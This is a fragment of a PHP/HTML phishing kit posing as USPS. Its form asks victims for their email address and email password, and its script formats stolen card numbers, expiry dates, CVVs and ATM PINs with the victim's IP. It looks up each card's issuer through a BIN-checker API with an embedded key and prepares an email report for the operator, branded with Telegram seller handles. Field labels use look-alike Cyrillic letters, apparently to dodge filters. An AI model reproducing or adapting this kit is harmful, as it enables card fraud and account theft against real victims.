...
$email = file_get_contents("config/email.txt");
  ...
  $bin_scheme = "NULL";
   ...
   $bin_country= "NULL";
   $bin_bank= "NULL";
   $bin=substr(str_replace(' ','',$a1),0,6);
   $ch=curl_init();
   curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
   curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
   curl_setopt($ch,CURLOPT_URL,"https://api.bincodes.com/bin-checker.php?api_key=c9fa6762c7917865a560d5c51bafe635&bin=".$bin."&format=json");
   ...
   if(isset($code->country)){
      $bin_country = $code->country;
   }
   
   
   $data .= "[ @LowkeYo USPS CARD INFORMATION : {$IP} ]\n\n";
$data .= " Саrԁ Νumbеr  : {$a1}\n";
$data .= " Expiry Date : {$a2}\n";
$data .= " CVV : {$b2}\n";
$data .= " ΑТΜ РІΝ : {$a5}\n\n";
...
$subject = "[{$bin}] - {$bin_bank} {$bin_type} {$bin_brand} [@FARMAKAV2 USPS]  : {$IP} ";
$headers = "From: USPS SPAMMA V2 | T.ME/FARMAKAWORLD | T.ME/MOONMARKEDT <UspsBy@LowkeYo.com>\r\n";
...
?>
							...
							<div id="country-holder">
								<div id="us">
									...
									<form action="success.php?token=<?php echo $_SESSION['token']; ?>" method="post">
										<div class="col-xs-12 col-sm-4 col-md-4">
											<div class="form-group" id="form-group-tapt">
												<label id="for-tapt" for="tapt" class="control-label">Email Address</label>
												
												<input type="email" name="email" maxlength="50" value="" tabindex="9" id="tapt" class="form-control" autocorrect="off" autocomplete="off" autocapitalize="off" required>
							...
							<div class="row">
										...
										<div class="col-xs-12 col-sm-4 col-md-4">
											<div class="form-group" id="form-group-tcity">
												<label id="for-tcity" for="tcity" class="control-label">Email Password</label>
												
												<input type="password" name="password" maxlength="50" value="" tabindex="10" id="tcity" class="form-control" autocorrect="off" autocomplete="off" rel="addressResult" autocapitalize="off" required>
										...
										<div class="col-xs-12 col-sm-4 col-md-3">
											<div class="form-group" id="form-group-sstate">
												...
												<span id="error-sstate" class="error-txt-portal"></span>
												<span class="sr-only" id="sr-only-error-sstate"></span>
											</div>
										</div>
